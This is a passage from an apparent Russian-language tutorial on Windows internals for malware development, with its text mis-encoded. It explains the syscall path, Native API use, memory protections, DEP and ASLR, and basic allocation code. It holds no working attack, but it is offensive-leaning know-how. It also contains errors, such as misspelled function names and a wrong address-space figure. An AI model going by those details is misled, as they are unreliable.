–ó–∞—Ç–µ–º, createFile –≤—ã–∑—ã–≤–∞–µ—Ç —Å–≤–æ—é —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é NTAPI, NtCreateFile, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ ntdll.dll.<br />
Ntdll.dll –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É <b>sysenter (x86)</b> –∏–ª–∏ <b>syscall (x64)</b>, –∫–æ—Ç–æ—Ä–∞—è –ø–µ—Ä–µ–≤–æ–¥–∏—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ —Ä–µ–∂–∏–º —è–¥—Ä–∞.<br />
<br />
–ó–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è —è–¥—Ä–∞ ntcreaterFile, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–∑—ã–≤–∞–µ—Ç –¥—Ä–∞–π–≤–µ—Ä—ã —è–¥—Ä–∞ –∏ –º–æ–¥—É–ª–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º–æ–π –∑–∞–¥–∞—á–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709124184.png"
		data-src="https://osint42.org/attachments/1746709124184-png.28/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709124184-png.28/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709124184.png"
			title="1746709124184.png"
			width="1090" height="643" loading="lazy" />
	</div><br />
<br />
<b>–ü—Ä–∏–º–µ—Ä —Å—Ç–µ–∫–∞ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–π</b><br />
<br />
–≠—Ç–æ—Ç –ø—Ä–∏–º–µ—Ä –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å—Ç–µ–∫–∞ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–π —á–µ—Ä–µ–∑ –æ—Ç–ª–∞–¥—á–∏–∫. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø—É—Ç–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –æ—Ç–ª–∞–¥—á–∏–∫–∞ –∫ –±–∏–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–µ—Ç —Ñ–∞–π–ª —á–µ—Ä–µ–∑ API Windows createFilew.<br />
<br />
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤—ã–∑—ã–≤–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é createrFilew WinAPI.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709130757.png"
		data-src="https://osint42.org/attachments/1746709130757-png.29/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709130757-png.29/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709130757.png"
			title="1746709130757.png"
			width="622" height="261" loading="lazy" />
	</div><br />
<br />
–î–∞–ª–µ–µ, –≤—ã–∑–æ–≤ –∏–∑ CreateFileW —Ñ—É–Ω–∫—Ü–∏–∏ NtCreateFile.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709136535.png"
		data-src="https://osint42.org/attachments/1746709136535-png.30/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709136535-png.30/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709136535.png"
			title="1746709136535.png"
			width="620" height="175" loading="lazy" />
	</div><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, —Ñ—É–Ω–∫—Ü–∏—è NtCreateFile –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é syscall –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –∏–∑ —Ä–µ–∂–∏–º–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Ä–µ–∂–∏–º —è–¥—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709141924.png"
		data-src="https://osint42.org/attachments/1746709141924-png.31/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709141924-png.31/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709141924.png"
			title="1746709141924.png"
			width="620" height="175" loading="lazy" />
	</div><br />
<br />
<b><u>–Ø–¥—Ä–æ –∑–∞—Ç–µ–º —Å–æ–∑–¥–∞–µ—Ç —Ñ–∞–π–ª.</u><br />
<br />
–ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ Native API (NTAPI)</b><br />
<br />
–í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –º–æ–≥—É—Ç –≤—ã–∑—ã–≤–∞—Ç—å syscalls (—Ç.–µ. —Ñ—É–Ω–∫—Ü–∏–∏ NTDLL) –Ω–∞–ø—Ä—è–º—É—é, –Ω–µ –æ–±—Ä–∞—â–∞—è—Å—å –∫ API Windows.<br />
<br />
API Windows –ø—Ä–æ—Å—Ç–æ –¥–µ–π—Å—Ç–≤—É–µ—Ç –∫–∞–∫ –æ–±–æ–ª–æ—á–∫–∞ –¥–ª—è Native API. –°–∫–∞–∑–∞–≤ —ç—Ç–æ, —Å—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ Native API —Å–ª–æ–∂–Ω–µ–µ –≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏, –ø–æ—Ç–æ–º—É —á—Ç–æ –æ–Ω –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ –Ω–µ –¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω Microsoft.<br />
–ë–æ–ª–µ–µ —Ç–æ–≥–æ, Microsoft —Å–æ–≤–µ—Ç—É–µ—Ç –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ Native API, –ø–æ—Ç–æ–º—É —á—Ç–æ –æ–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –∏–∑–º–µ–Ω–µ–Ω—ã –≤ –ª—é–±–æ–µ –≤—Ä–µ–º—è –±–µ–∑ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è.<br />
<br />
<b><u>–¢–µ–ø–µ—Ä—å —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç—å—é –≤ Windows</u></b><br />
<br />
–í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –∏ —Ä–∞–∑–±–∏–µ–Ω–∏–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã<br />
<br />
–ü–∞–º—è—Ç—å –≤ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö –Ω–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é –Ω–∞ —Ñ–∏–∑–∏—á–µ—Å–∫—É—é –ø–∞–º—è—Ç—å (—Ç.–µ. –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω—É—é –ø–∞–º—è—Ç—å). –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ –ø–∞–º—è—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –Ω–∞ —Ñ–∏–∑–∏—á–µ—Å–∫–∏–µ –∞–¥—Ä–µ—Å–∞ –ø–∞–º—è—Ç–∏. –ü—Ä–∏—á–∏–Ω –¥–ª—è —ç—Ç–æ–≥–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ, –Ω–æ –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ —Ü–µ–ª—å —Å–æ—Å—Ç–æ–∏—Ç –≤ —Ç–æ–º, —á—Ç–æ–±—ã —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –∫–∞–∫ –º–æ–∂–Ω–æ –±–æ–ª—å—à–µ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />
–í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∞ –Ω–∞ —Ñ–∏–∑–∏—á–µ—Å–∫—É—é –ø–∞–º—è—Ç—å, –Ω–æ –º–æ–∂–µ—Ç —Ç–∞–∫–∂–µ —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –Ω–∞ –¥–∏—Å–∫–µ. –° –ø–æ–º–æ—â—å—é –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–æ–≤–∞–Ω–∏—è –ø–∞–º—è—Ç–∏ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤–æ–∑–º–æ–∂–Ω—ã–º –¥–ª—è –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –¥–µ–ª–∏—Ç—å –æ–¥–∏–Ω –∏ —Ç–æ—Ç –∂–µ —Ñ–∏–∑–∏—á–µ—Å–∫–∏–π –∞–¥—Ä–µ—Å, –∏–º–µ—è —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å –ø–∞–º—è—Ç–∏.<br />
–í–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –æ–ø–∏—Ä–∞–µ—Ç—Å—è –Ω–∞ –∫–æ–Ω—Ü–µ–ø—Ü–∏—é —Ä–∞–∑–±–∏–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –∫–æ—Ç–æ—Ä–æ–µ –¥–µ–ª–∏—Ç –ø–∞–º—è—Ç—å –Ω–∞ –±–ª–æ–∫–∏ –ø–æ 4–ö–ë, –Ω–∞–∑—ã–≤–∞–µ–º—ã–µ &quot;—Å—Ç—Ä–∞–Ω–∏—Ü–∞–º–∏&quot;.<br />
<br />
–°–º–æ—Ç—Ä–∏—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –∏–∑ –∫–Ω–∏–≥–∏ &quot;Windows Internals 7th edition - part 1&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709155449.png"
		data-src="https://osint42.org/attachments/1746709155449-png.32/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709155449-png.32/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709155449.png"
			title="1746709155449.png"
			width="460" height="281" loading="lazy" />
	</div><br />
<br />
–°—Ç—Ä–∞–Ω–∏—Ü—ã, –Ω–∞—Ö–æ–¥—è—â–∏–µ—Å—è –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–º –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞, –º–æ–≥—É—Ç –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º –∏–∑ 3 —Å–æ—Å—Ç–æ—è–Ω–∏–π:<br />
<ol>
<li data-xf-list-type="ol">–°–≤–æ–±–æ–¥–Ω–∞—è - –°—Ç—Ä–∞–Ω–∏—Ü–∞ –Ω–∏ –≤ —á–µ–º –Ω–µ —É—á–∞—Å—Ç–≤—É–µ—Ç, –æ–Ω–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞. –û–Ω–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è —Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∏—è –∏–ª–∏ –∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–∏—è.</li>
<li data-xf-list-type="ol">–ó–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω–∞—è - –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∞ –¥–ª—è –±—É–¥—É—â–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è. –î–∏–∞–ø–∞–∑–æ–Ω –∞–¥—Ä–µ—Å–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥—Ä—É–≥–∏–º–∏ —Ñ—É–Ω–∫—Ü–∏—è–º–∏ –≤—ã–¥–µ–ª–µ–Ω–∏—è. –°—Ç—Ä–∞–Ω–∏—Ü–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞ –∏ –Ω–µ —Å–≤—è–∑–∞–Ω–∞ —Å —Ñ–∏–∑–∏—á–µ—Å–∫–∏–º —Ö—Ä–∞–Ω–∏–ª–∏—â–µ–º. –û–Ω–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–∏—è.</li>
<li data-xf-list-type="ol">–ó–∞–∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è - –°—Ç—Ä–∞–Ω–∏—Ü–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ –∏ –¥–æ—Å—Ç—É–ø –∫ –Ω–µ–π –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç—Å—è –æ–¥–Ω–æ–π –∏–∑ –∫–æ–Ω—Å—Ç–∞–Ω—Ç –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏. –°–∏—Å—Ç–µ–º–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç –∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç –∫–∞–∂–¥—É—é –∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤ —Ñ–∏–∑–∏—á–µ—Å–∫—É—é –ø–∞–º—è—Ç—å —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –ø–µ—Ä–≤–æ–π –ø–æ–ø—ã—Ç–∫–µ —á—Ç–µ–Ω–∏—è –∏–ª–∏ –∑–∞–ø–∏—Å–∏ –Ω–∞ —ç—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—É. –ö–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è, —Å–∏—Å—Ç–µ–º–∞ –æ—Å–≤–æ–±–æ–∂–¥–∞–µ—Ç —Ö—Ä–∞–Ω–∏–ª–∏—â–µ –¥–ª—è –∑–∞–∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü.</li>
</ol>–ö–∞–∫ —Ç–æ–ª—å–∫–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∑–∞–∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω—ã, –∏–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä –∑–∞—â–∏—Ç—ã. –°–ø–∏—Å–æ–∫ –∫–æ–Ω—Å—Ç–∞–Ω—Ç –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank" class="link link--external" rel="noopener">–∑–¥–µ—Å—å</a>, –Ω–æ –Ω–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–º–µ—Ä—ã.<br />
<ul>
<li data-xf-list-type="ul">PAGE_NOACCESS - –æ—Ç–∫–ª—é—á–∞–µ—Ç –≤—Å–µ –¥–æ—Å—Ç—É–ø—ã –∫ –∑–∞–∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–º—É —Ä–µ–≥–∏–æ–Ω—É —Å—Ç—Ä–∞–Ω–∏—Ü. –ü–æ–ø—ã—Ç–∫–∞ —á—Ç–µ–Ω–∏—è –∏–∑ —ç—Ç–æ–≥–æ —Ä–µ–≥–∏–æ–Ω–∞, –∑–∞–ø–∏—Å–∏ –≤ –Ω–µ–≥–æ –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –Ω–∞—Ä—É—à–µ–Ω–∏—é –¥–æ—Å—Ç—É–ø–∞.</li>
<li data-xf-list-type="ul">PAGE_EXECUTE_READWRITE - –≤–∫–ª—é—á–∞–µ—Ç —á—Ç–µ–Ω–∏–µ, –∑–∞–ø–∏—Å—å –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ. –≠—Ç–æ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –∫—Ä–∞–π–Ω–µ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –∏ –æ–±—ã—á–Ω–æ —è–≤–ª—è–µ—Ç—Å—è –ø–ª–æ—Ö–∏–º –ø–æ–∫–∞–∑–∞—Ç–µ–ª–µ–º, –ø–æ—Å–∫–æ–ª—å–∫—É –ø–∞–º—è—Ç—å —Ä–µ–¥–∫–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.</li>
<li data-xf-list-type="ul">PAGE_READONLY - –≤–∫–ª—é—á–∞–µ—Ç —Ç–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ –≤ –∑–∞–∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–º —Ä–µ–≥–∏–æ–Ω–µ —Å—Ç—Ä–∞–Ω–∏—Ü. –ü–æ–ø—ã—Ç–∫–∞ –∑–∞–ø–∏—Å–∏ –≤ –∑–∞–∫–æ–º–º–∏—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ä–µ–≥–∏–æ–Ω –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –Ω–∞—Ä—É—à–µ–Ω–∏—é –¥–æ—Å—Ç—É–ø–∞.</li>
</ul>–ó–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏<br />
<br />
–°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã –æ–±—ã—á–Ω–æ –∏–º–µ—é—Ç –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –∏ –∞—Ç–∞–∫. –≠—Ç–æ —Ç–∞–∫–∂–µ –≤–∞–∂–Ω–æ —É—á–∏—Ç—ã–≤–∞—Ç—å, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, –±—É–¥—É—Ç –≤—Å—Ç—Ä–µ—á–∞—Ç—å—Å—è –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∏–ª–∏ –æ—Ç–ª–∞–¥–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û.<br />
<ul>
<li data-xf-list-type="ul">–ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö (DEP) - DEP —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏ –Ω–∞ —É—Ä–æ–≤–Ω–µ —Å–∏—Å—Ç–µ–º—ã, –∫–æ—Ç–æ—Ä–∞—è –≤—Å—Ç—Ä–æ–µ–Ω–∞ –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É, –Ω–∞—á–∏–Ω–∞—è —Å Windows XP –∏ Windows Server 2003. –ï—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä –∑–∞—â–∏—Ç—ã —Å—Ç—Ä–∞–Ω–∏—Ü—ã —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ PAGE_READONLY, —Ç–æ DEP –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ –≤ —ç—Ç–æ–º —Ä–µ–≥–∏–æ–Ω–µ –ø–∞–º—è—Ç–∏.</li>
<li data-xf-list-type="ul">–°–ª—É—á–∞–π–Ω–æ–µ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ (ASLR) - ASLR —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ –Ω–∞ –∞–¥—Ä–µ—Å–∞ –ø–∞–º—è—Ç–∏. ASLR —Å–ª—É—á–∞–π–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –º–µ–Ω—è–µ—Ç –ø–æ–ª–æ–∂–µ–Ω–∏–µ –∫–ª—é—á–µ–≤—ã—Ö –æ–±–ª–∞—Å—Ç–µ–π –¥–∞–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ, –≤–∫–ª—é—á–∞—è –±–∞–∑—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ –ø–æ–ª–æ–∂–µ–Ω–∏—è —Å—Ç–µ–∫–∞, –∫—É—á–∏ –∏ –±–∏–±–ª–∏–æ—Ç–µ–∫.</li>
</ul>–ü—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ Windows –≤–∞–∂–Ω–æ –∑–Ω–∞—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø—Ä–æ—Ü–µ—Å—Å x86 –∏–ª–∏ x64. –ü—Ä–æ—Ü–µ—Å—Å—ã x86 –∏–º–µ—é—Ç –º–µ–Ω—å—à–µ–µ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–∞–º—è—Ç–∏ - 4 –ì–ë (0xFFFFFFFF), —Ç–æ–≥–¥–∞ –∫–∞–∫ —É x64 –Ω–∞–º–Ω–æ–≥–æ –±–æ–ª—å—à–µ - 128 –¢–ë (0xFFFFFFFFFFFFFFFF).<br />
<br />
<b>–ü—Ä–∏–º–µ—Ä –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏</b><br />
<br />
–í —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—é—Ç—Å—è –Ω–µ–±–æ–ª—å—à–∏–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã –∫–æ–¥–∞, —á—Ç–æ–±—ã –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –º–æ–∂–Ω–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å –ø–∞–º—è—Ç—å—é Windows —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏–∏ –° –∏ Windows API. –ü–µ—Ä–≤—ã–π —à–∞–≥ –≤–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–∏ —Å –ø–∞–º—è—Ç—å—é - —ç—Ç–æ –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏. –ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–ø–æ—Å–æ–±–æ–≤ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏, —á—Ç–æ –≤ —Å—É—â–Ω–æ—Å—Ç–∏ —Å–≤–æ–¥–∏—Ç—Å—è –∫ —Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∏—é –ø–∞–º—è—Ç–∏ –≤–Ω—É—Ç—Ä–∏ –≤—ã–ø–æ–ª–Ω—è—é—â–µ–≥–æ—Å—è –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Allocating –∞ memory buffer 100 bytes

// Method 1 ‚Äî Using malloc()
PVOID pAddress = malloc(100);

// Method 2 ‚Äî Using –ù–µ–∞—Ä–ê11–æ—Å ()
PVOID pAddress = HeapAlloc (GetProcessHeap (), 0, 100);

// Method 3 ‚Äî Using LocalAlloc ()
PVOID pAddress = LocalAlloc(LPTR, 100);</code></pre>
	</div>
</div><br />
